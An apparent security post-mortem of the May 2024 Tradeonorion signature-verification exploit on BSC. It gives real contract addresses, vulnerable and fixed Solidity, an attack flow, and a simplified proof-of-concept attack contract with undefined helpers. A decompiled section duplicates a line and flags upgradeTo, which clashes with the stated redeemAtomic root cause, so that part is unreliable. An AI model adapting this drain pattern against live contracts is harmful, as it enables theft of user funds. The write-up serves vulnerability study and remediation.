# Tradeonorion — redeemAtomic Signature Verification Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | Tradeonorion (Orion Protocol) |
| **Chain** | BSC |
| **Loss** | ~$645,000 |
| **Attack Contract** | [0xf8bfac82](https://bscscan.com/address/0xf8bfac82bdd7ac82d3aeec98b9e1e73579509db6) |
| **Vulnerable Contract** | [0xe9d1D2a2](https://bscscan.com/address/0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca) |
| **BUSDT** | [0x55d39832](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **ORN** | [0xe4CA1F75](https://bscscan.com/address/0xe4CA1F75ECA6214393fCE1C1b316C237664EaA8e) |
| **XRP** | [0x1D2F0da1](https://bscscan.com/address/0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE) |
| **Root Cause** | A flaw in the signature verification logic of `redeemAtomic()` allowed attacker-controlled signatures to be accepted as valid, enabling the combined use of `depositAssetTo()` + `redeemAtomic()` to drain BUSDT, ORN, XRP, and BNB |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Tradeonorion_exp.sol) |

---

## 1. Vulnerability Overview

Tradeonorion's `redeemAtomic()` function settles atomic swap orders but contains a flaw in order signature verification. The attacker called `redeemAtomic()` with manipulated order data signed by themselves, draining all assets including BUSDT and ORN deposited by other users (Alice). A V3 flash loan was used to source additional BUSDT, maximizing the attack's scale.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: redeemAtomic signature verification flaw
contract OrionExchange {
    function redeemAtomic(
        LibAtomic.AtomicSwap memory swap,
        bytes memory secretHash,
        bytes memory signature
    ) external {
        // Signer verification — flawed
        // Manipulated data signed with the attacker's own key can be accepted as valid
        address signer = recoverSigner(swap, signature);
        // Insufficient signer validation allows processing with an attacker-controlled address
        require(isRegistered(signer), "not registered");

        // Transfer victim's assets
        _transfer(swap.sender, swap.receiver, swap.asset, swap.amount);
    }
}

// ✅ Safe code: strict signature verification
function redeemAtomic(LibAtomic.AtomicSwap memory swap, bytes memory secretHash, bytes memory sig) external {
    bytes32 swapHash = hashSwap(swap);
    address signer = ECDSA.recover(swapHash, sig);
    require(signer == swap.sender, "signer mismatch");
    require(block.timestamp <= swap.expiry, "swap expired");
    require(!usedHashes[swapHash], "already redeemed");
    usedHashes[swapHash] = true;
    _transfer(swap.sender, swap.receiver, swap.asset, swap.amount);
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Tradeonorion_decompiled.sol
contract Tradeonorion {
contract Tradeonorion {
    address public owner;


    // Selector: 0x3659cfe6
    // Alternative: upgradeTo_790AA3D()
    function upgradeTo(address p0) external {}  // ❌ Vulnerability

    // Selector: 0x4f1ef286
    // Alternative: upgradeToAndCall_23573451()
    function upgradeToAndCall(address p0, bytes memory p1) external {}

    // Selector: 0x5c60da1b
    function implementation() external {}

    // Selector: 0x8f283970
    // Alternative: changeAdmin_277BB5030()
    function changeAdmin(address p0) external {}

    // Selector: 0xf851a440
    function admin() external {}

    // Selector: 0x68616e67
    function unknown_68616e67() external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (acting as both Alice and Attacker)
  │
  ├─→ [1] Alice: depositAssetTo(BUSDT) + depositAssetTo(ORN)
  │         └─ Victim assets deposited into the contract
  │
  ├─→ [2] Alice: lockStake()
  │
  ├─→ [3] V3 Flash Loan: borrow additional BUSDT
  │
  ├─→ [4] redeemAtomic(manipulated order, attacker signature) — repeated
  │         └─ Signature verification flaw → attacker signature passes
  │         └─ Victim assets → transferred to attacker
  │
  ├─→ [5] requestReleaseStake() → reclaim stake
  │
  ├─→ [6] withdrawTo(BUSDT/ORN/BNB/XRP)
  │
  ├─→ [7] Repay V3 flash loan
  │
  └─→ [8] ~$645K drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IOrionExchange {
    struct AtomicSwap {
        address sender;
        address receiver;
        address asset;
        uint256 amount;
        uint256 expiry;
        bytes32 secretHash;
    }

    function depositAssetTo(address asset, uint256 amount, address to) external;
    function redeemAtomic(AtomicSwap memory swap, bytes memory secretHash, bytes memory sig) external;
    function lockStake() external;
    function requestReleaseStake() external;
    function withdrawTo(address asset, uint256 amount, address to) external;
    function getLiabilities(address user) external view returns (uint256);
    function getBalances(address user) external view returns (uint256);
}

contract AttackContract {
    IOrionExchange constant orion = IOrionExchange(0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ORN   = IERC20(0xe4CA1F75ECA6214393fCE1C1b316C237664EaA8e);

    function testExploit() external {
        // [1] Acting as Alice: deposit assets
        BUSDT.approve(address(orion), type(uint256).max);
        orion.depositAssetTo(address(BUSDT), busdtAmount, address(this));
        orion.depositAssetTo(address(ORN), ornAmount, address(this));
        orion.lockStake();

        // [2] Flash loan additional BUSDT via V3
        flashLoanBUSDT();

        // [3] Repeatedly call redeemAtomic with manipulated signature
        IOrionExchange.AtomicSwap memory swap = IOrionExchange.AtomicSwap({
            sender: victim,        // victim address
            receiver: address(this),
            asset: address(BUSDT),
            amount: victimBalance,
            expiry: block.timestamp + 1 hours,
            secretHash: bytes32(0)
        });
        bytes memory attackerSig = signWithAttackerKey(swap);
        orion.redeemAtomic(swap, "", attackerSig);  // Signature verification flaw → passes

        // [4] Withdraw assets
        orion.requestReleaseStake();
        orion.withdrawTo(address(BUSDT), orion.getBalances(address(this)), address(this));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Signature Verification Bypass (Atomic Swap Flaw) |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **Attack Vector** | External (redeemAtomic with manipulated signature) |
| **DApp Category** | Decentralized Exchange (Atomic Swap) |
| **Impact** | Full drainage of deposited assets (~$645K) |

## 6. Remediation Recommendations

1. **Strict signature verification**: Precisely validate `signer == swap.sender`
2. **Swap hash replay prevention**: Track used swap hashes with a `mapping`
3. **Expiry enforcement**: Enforce `block.timestamp <= swap.expiry`
4. **Use OpenZeppelin ECDSA**: Strengthen signature verification with standard libraries

## 7. Lessons Learned

- A signature verification flaw in atomic swaps is a simple code bug that nevertheless exposes the entire protocol's assets to risk.
- Together with the signature malleability issue in TCH (2024-05), signature verification vulnerabilities are recurring across BSC DeFi.
- Asset transfer functions such as `redeemAtomic` must verify that the signer exactly matches `swap.sender` — this is the critical invariant.